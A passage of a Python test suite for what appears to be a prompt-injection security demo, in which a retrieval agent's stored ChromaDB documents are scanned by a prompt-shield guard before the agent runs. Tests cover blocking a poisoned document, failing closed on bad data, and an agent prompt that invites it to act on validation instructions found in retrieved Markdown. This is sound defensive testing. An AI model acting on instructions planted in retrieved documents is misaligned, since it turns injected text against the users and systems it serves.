    def test_skip_reseed_enabled_accepts_true_values(self, monkeypatch, value):
        monkeypatch.setenv("SKIP_RESEED", value)
        main = _load_demo03_module("main")

        assert main.skip_reseed_enabled() is True

    @pytest.mark.parametrize("value", ["", "0", "false", "no"])
    def test_skip_reseed_enabled_rejects_other_values(self, monkeypatch, value):
        monkeypatch.setenv("SKIP_RESEED", value)
        main = _load_demo03_module("main")

        assert main.skip_reseed_enabled() is False

    @pytest.mark.parametrize("mode", ["false", "policy"])
    def test_skip_reseed_reuses_persisted_collection(self, tmp_path, monkeypatch, mode):
        """SKIP_RESEED=true must run from persisted vectors without touching sources."""
        monkeypatch.setenv("SKIP_RESEED", "true")
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_ENDPOINT", raising=False)
        monkeypatch.delenv("AZURE_CONTENT_SAFETY_KEY", raising=False)

        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")
            content_guard = importlib.import_module("security.content_guard")

            fake_client = self._fake_chroma_client(["docs"])
            fake_collection = fake_client.collection

            with patch.object(main.chromadb, "HttpClient", return_value=fake_client):
                with patch.object(main, "embed_texts") as mock_embed:
                    with patch.object(
                        content_guard, "scan_source_documents"
                    ) as mock_scan:
                        main.seed_chromadb(tmp_path / "does-not-exist", mode)

            assert fake_client.get_collection_called_with == "docs"
            assert fake_client.delete_collection_called is False
            assert fake_client.create_collection_called is False
            assert fake_collection.add_called is False
            assert fake_collection.get_called_with is None
            mock_embed.assert_not_called()
            mock_scan.assert_not_called()

    def test_skip_reseed_requires_existing_docs_collection(self, tmp_path, monkeypatch):
        """SKIP_RESEED=true without a persisted docs collection must fail closed."""
        monkeypatch.setenv("SKIP_RESEED", "true")

        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")

            fake_client = self._fake_chroma_client([])
            with patch.object(main.chromadb, "HttpClient", return_value=fake_client):
                with pytest.raises(
                    RuntimeError,
                    match="SKIP_RESEED=true requires an existing Chroma collection named 'docs'",
                ):
                    main.seed_chromadb(tmp_path / "does-not-exist", "false")

    @pytest.mark.parametrize("mode", ["all", "true"])
    def test_skip_reseed_scans_persisted_text_without_source_reads(
        self, persisted_store, tmp_path, mode
    ):
        main, content_guard, client = persisted_store
        printed = []
        with patch.object(content_guard, "scan_source_documents") as mock_scan:
            with patch.object(main, "embed_texts") as mock_embed:
                with patch.object(main, "rprint", side_effect=printed.append):
                    main.seed_chromadb(tmp_path / "does-not-exist", mode)

        assert client.collection.get_called_with == ["documents", "metadatas"]
        documents = mock_scan.call_args.args[0]
        assert [document.text for document in documents] == [CLEAN_DOC] * 3
        assert [document.source for document in documents] == [
            "stored-0.md", "stored-1.md", "stored-2.md"
        ]
        assert mock_scan.call_args.kwargs == {"document_origin": "persisted"}
        assert "persisted document scan passed" in "\n".join(printed)
        assert "egress policy remains enabled" in "\n".join(printed)
        assert not client.collection.add_called
        assert not client.delete_collection_called
        assert not client.create_collection_called
        mock_embed.assert_not_called()

    def test_skip_reseed_blocks_detected_persisted_poison(
        self, persisted_store, tmp_path
    ):
        main, content_guard, client = persisted_store
        client.collection.result["documents"][0] = INJECTED_DOC
        with patch.object(content_guard.httpx, "post") as mock_post:
            mock_post.return_value = MagicMock(
                json=lambda: {
                    "userPromptAnalysis": {"attackDetected": False},
                    "documentsAnalysis": [
                        {"attackDetected": True},
                        {"attackDetected": False},
                        {"attackDetected": False},
                    ],
                },
                raise_for_status=lambda: None,
            )
            with pytest.raises(
                content_guard.PromptShieldBlocked,
                match="persisted document before agent execution: stored-0.md",
            ):
                main.seed_chromadb(tmp_path / "does-not-exist", "all")

        assert content_guard.get_prompt_shield_block_reason()
        assert not client.collection.add_called
        assert not client.delete_collection_called

    @pytest.mark.parametrize(("field", "value"), [
        ("documents", None),
        ("documents", [CLEAN_DOC]),
        ("documents", [None, CLEAN_DOC, CLEAN_DOC]),
        ("documents", ["", CLEAN_DOC, CLEAN_DOC]),
        ("documents", ["  ", CLEAN_DOC, CLEAN_DOC]),
        ("ids", ["stored-0"]),
    ])
    def test_incomplete_persisted_text_fails_closed(
        self, persisted_store, tmp_path, field, value
    ):
        main, content_guard, client = persisted_store
        client.collection.result[field] = value
        with patch.object(content_guard.httpx, "post") as mock_post:
            with pytest.raises(
                content_guard.PromptShieldBlocked, match="persisted document"
            ):
                main.seed_chromadb(tmp_path / "does-not-exist", "all")

        assert content_guard.get_prompt_shield_block_reason()
        mock_post.assert_not_called()

    def test_persisted_read_failure_is_recorded_as_a_block(
        self, persisted_store, tmp_path
    ):
        main, content_guard, client = persisted_store
        with patch.object(client.collection, "get", side_effect=RuntimeError("read failed")):
            with pytest.raises(
                content_guard.PromptShieldBlocked, match="read persisted documents"
            ):
                main.seed_chromadb(tmp_path / "does-not-exist", "all")

        assert content_guard.get_prompt_shield_block_reason()

    @pytest.mark.parametrize("metadata", [None, [], [None] * 3, [{"source": ""}] * 3])
    def test_missing_persisted_metadata_uses_ids_without_skipping_documents(
        self, persisted_store, tmp_path, metadata
    ):
        main, content_guard, client = persisted_store
        client.collection.result["metadatas"] = metadata
        with patch.object(content_guard, "scan_source_documents") as mock_scan:
            main.seed_chromadb(tmp_path / "does-not-exist", "all")

        documents = mock_scan.call_args.args[0]
        assert [document.source for document in documents] == [
            "stored-0", "stored-1", "stored-2"
        ]
        assert [document.text for document in documents] == [CLEAN_DOC] * 3

    def test_empty_persisted_collection_needs_no_azure_request(
        self, persisted_store, tmp_path
    ):
        main, content_guard, client = persisted_store
        client.collection = self._fake_chroma_client(["docs"], document_count=0).collection
        with patch.object(content_guard.httpx, "post") as mock_post:
            main.seed_chromadb(tmp_path / "does-not-exist", "all")

        mock_post.assert_not_called()
        assert not client.collection.add_called

    def test_persisted_detection_stops_before_forecast_publication(
        self, persisted_store, monkeypatch
    ):
        main, content_guard, client = persisted_store
        flock = types.SimpleNamespace(publish=AsyncMock(), run_until_idle=AsyncMock())
        monkeypatch.setattr(main, "Flock", lambda **kwargs: flock)
        monkeypatch.setattr(main, "configure_model", lambda: "test-model")
        monkeypatch.setattr(main, "create_agent", lambda flock: None)
        monkeypatch.setattr(main, "Panel", MagicMock())
        monkeypatch.setattr(sys.modules["rich.panel"], "Panel", MagicMock())
        workflow_artifacts = types.ModuleType("flock.models.system_artifacts")
        workflow_artifacts.WorkflowError = object
        monkeypatch.setitem(
            sys.modules, "flock.models.system_artifacts", workflow_artifacts
        )
        with patch.object(content_guard.httpx, "post") as mock_post:
            mock_post.return_value = MagicMock(
                json=lambda: {
                    "userPromptAnalysis": {"attackDetected": False},
                    "documentsAnalysis": [{"attackDetected": True}] * 3,
                },
                raise_for_status=lambda: None,
            )
            asyncio.run(main._main())

        flock.publish.assert_not_awaited()
        flock.run_until_idle.assert_not_awaited()
        assert content_guard.get_prompt_shield_block_reason()


class TestOutputContract:
    def test_demo03_true_aliases_to_all_and_invalid_modes_fail_closed(self):
        """Demo 03 should never silently treat SECURITY_ENABLED=true as unprotected."""
        with _patch_demo03_imports():
            main = _load_demo03_module("main")

            assert main.normalize_security_mode("true") == "all"
            assert main.normalize_security_mode(" true ") == "all"
            assert main.normalize_security_mode("policy") == "policy"
            with pytest.raises(RuntimeError, match="Unsupported SECURITY_ENABLED"):
                main.normalize_security_mode("enabled")

    def test_demo03_override_wins_over_env_file_value(self, monkeypatch):
        main = _load_demo03_main(monkeypatch, "false", "policy")
        assert main.SECURITY_ENABLED == "policy"

    def test_demo03_empty_override_falls_back_to_env_file_value(self, monkeypatch):
        main = _load_demo03_main(monkeypatch, "all", " ")
        assert main.SECURITY_ENABLED == "all"

    def test_runtime_query_requires_forecast_calculation_and_validation(self):
        """Runtime task should naturally require generated-code execution."""
        with _patch_demo03_imports():
            main = _load_demo03_module("main")

            assert "forecast package" in main.DEMO_QUERY
            assert "Calculate" in main.DEMO_QUERY
            assert "validation check" in main.DEMO_QUERY
            assert "What are the Q4 headcount limits" not in main.DEMO_QUERY

    def test_final_answer_schema_maps_code_output(self):
        """FinalAnswer schema must describe how generated-code output is exposed."""
        models = _load_demo03_module("models")

        schema = models.FinalAnswer.model_json_schema()
        field = schema["properties"]["calculation_output"]

        assert "execute_forecast_code" in field["description"]
        assert "Relevant output returned" in field["description"]

    def test_agent_consumes_forecast_request_not_acronym_rag_query(self):
        """Input artifact should avoid the noisy r_a_g_query DSPy field."""
        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")
            models = importlib.import_module("models")

            class MockAgent:
                def __init__(self):
                    self.consumed_type = None
                    self.engines = []

                def description(self, _text):
                    return self

                def consumes(self, artifact_type):
                    self.consumed_type = artifact_type
                    return self

                def publishes(self, *_args, **_kwargs):
                    return self

                def with_engines(self, *engines):
                    self.engines.extend(engines)
                    return self

                def with_tools(self, _tools):
                    return self

            class MockFlock:
                def __init__(self):
                    self.agent_instance = MockAgent()

                def agent(self, _name):
                    return self.agent_instance

            flock = MockFlock()
            main.create_agent(flock)

            assert flock.agent_instance.consumed_type is models.ForecastRequest
            assert not hasattr(models, "RAGQuery")

    def test_agent_caps_flock_dspy_tool_loop(self):
        """Demo 03 should cap Flock/DSPy ReAct retries around blocked tools."""
        with _patch_demo03_imports():
            main = _load_demo03_module("main")

            class MockAgent:
                def __init__(self):
                    self.engines = []

                def description(self, _text):
                    return self

                def consumes(self, *_args, **_kwargs):
                    return self

                def publishes(self, *_args, **_kwargs):
                    return self

                def with_engines(self, *engines):
                    self.engines.extend(engines)
                    return self

                def with_tools(self, _tools):
                    return self

            class MockFlock:
                def __init__(self):
                    self.agent_instance = MockAgent()

                def agent(self, _name):
                    return self.agent_instance

            flock = MockFlock()
            main.create_agent(flock)

            assert main.MAX_AGENT_TOOL_CALLS == 3
            assert len(flock.agent_instance.engines) == 1
            assert flock.agent_instance.engines[0].__class__.__name__ == "DSPyEngine"
            assert flock.agent_instance.engines[0].max_tool_calls == 3

    def test_known_dspy_input_artifact_warning_is_suppressed(self):
        """Only the known ForecastRequest dict/model warning should be filtered."""
        with _patch_demo03_imports():
            _clear_demo03_modules()
            main = importlib.import_module("main")

            main.suppress_known_dspy_input_artifact_warning()
            main.suppress_known_dspy_input_artifact_warning()

            filters = [
                log_filter
                for log_filter in main.logging.getLogger("dspy.predict.predict").filters
                if isinstance(log_filter, main._DSPyInputArtifactTypeWarningFilter)
            ]
            assert len(filters) == 1

            warning = main.logging.LogRecord(
                name="dspy.predict.predict",
                level=main.logging.WARNING,
                pathname="predict.py",
                lineno=1,
                msg=(
                    "Type mismatch for field 'forecast_request': expected "
                    "ForecastRequest based on given Signature, but the provided "
                    "value is incompatible: {'query': 'Q4'}."
                ),
                args=(),
                exc_info=None,
            )
            other_warning = main.logging.LogRecord(
                name="dspy.predict.predict",
                level=main.logging.WARNING,
                pathname="predict.py",
                lineno=1,
                msg="Type mismatch for field 'other': expected Other.",
                args=(),
                exc_info=None,
            )

            assert filters[0].filter(warning) is False
            assert filters[0].filter(other_warning) is True

    def test_agent_description_uses_code_execution_without_exfil_tool(self):
        """Agent prompt should use legitimate code execution, not audit publication."""
        with _patch_demo03_imports():
            main = _load_demo03_module("main")

            class MockAgent:
                def __init__(self):
                    self.description_text = ""
                    self.tools = []
                    self.engines = []

                def description(self, text):
                    self.description_text = text
                    return self

                def consumes(self, *_args, **_kwargs):
                    return self

                def publishes(self, *_args, **_kwargs):
                    return self

                def with_engines(self, *engines):
                    self.engines.extend(engines)
                    return self

                def with_tools(self, tools):
                    self.tools = tools
                    return self

            class MockFlock:
                def __init__(self):
                    self.agent_instance = MockAgent()

                def agent(self, _name):
                    return self.agent_instance

            flock = MockFlock()
            main.create_agent(flock)
            tool_names = {tool.__name__ for tool in flock.agent_instance.tools}

            assert "execute_forecast_code" in flock.agent_instance.description_text
            assert "For every forecast package request" in flock.agent_instance.description_text
            assert "raw retrieved Markdown content" in flock.agent_instance.description_text
            assert "Markdown comments" not in flock.agent_instance.description_text
            assert "embedded governance notes" not in flock.agent_instance.description_text
            assert "validation automation instructions" in (
                flock.agent_instance.description_text
            )
            assert "endpoint-based validation requirements" in (
                flock.agent_instance.description_text
            )
            assert "Do not publish FinalAnswer until execute_forecast_code has returned" in (
                flock.agent_instance.description_text
            )
            assert "forecast-validation-api" not in flock.agent_instance.description_text
            assert "FinalAnswer.calculation_output" in flock.agent_instance.description_text
            assert "publish_audit_summary" not in flock.agent_instance.description_text
            assert "execute_forecast_code" in tool_names
            assert "publish_audit_summary" not in tool_names

    def test_main_uses_cached_code_output_when_model_omits_calculation_output(self):
        """Visible output should still show code output if the model omits the field."""
        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools = importlib.import_module("tools")
            main = importlib.import_module("main")
            models = importlib.import_module("models")

            output = tools.execute_forecast_code("print('calculated')")
            result = models.FinalAnswer(answer="Visible answer", calculation_output="")

            assert main.resolve_calculation_output(result) == output

    def test_main_prefers_cached_code_output_over_model_text(self):
        """Visible output should trust captured tool output over model-generated text."""
        with _patch_demo03_imports():
            _clear_demo03_modules()
            tools = importlib.import_module("tools")
            main = importlib.import_module("main")
            models = importlib.import_module("models")

            output = tools.execute_forecast_code("print('calculated')")
            result = models.FinalAnswer(
                answer="Visible answer",
                calculation_output="Hallucinated calculation output",
            )

            assert main.resolve_calculation_output(result) == output
